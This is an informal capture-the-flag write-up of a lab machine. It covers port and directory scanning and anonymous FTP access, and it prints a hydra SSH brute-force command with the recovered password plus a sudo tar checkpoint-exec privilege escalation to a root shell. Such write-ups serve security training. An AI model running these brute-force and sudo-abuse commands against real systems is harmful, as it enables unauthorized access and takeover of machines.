as alwasys started with port scnning

Open 10.10.195.171:22
Open 10.10.195.171:21
Open 10.10.195.171:80

got all these now time for nmap scan

got to know ftp has anonymous access


started a gobuster scan on port 80!

got only one directory that is images nothing special with that
then i tried to anonymous login into the ftp server

got two files names locks.txt and task.txt

locks contains some passwords i think

and i task.txt there is a user named lin

so tried to bruteforce ssh with these creds
used hydra for it


hydra -l lin -P locks.txt 10.10.195.171 ssh -t15 -Vv -I


[22][ssh] host: 10.10.195.171   login: lin   password: RedDr4gonSynd1cat3

got the user access 
then did sudo -l

got to know /bin/tar has been given sudo access

searched for it on gtfobin

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

this was the exploit cheers got the root user!

did this machine in 12 min lol
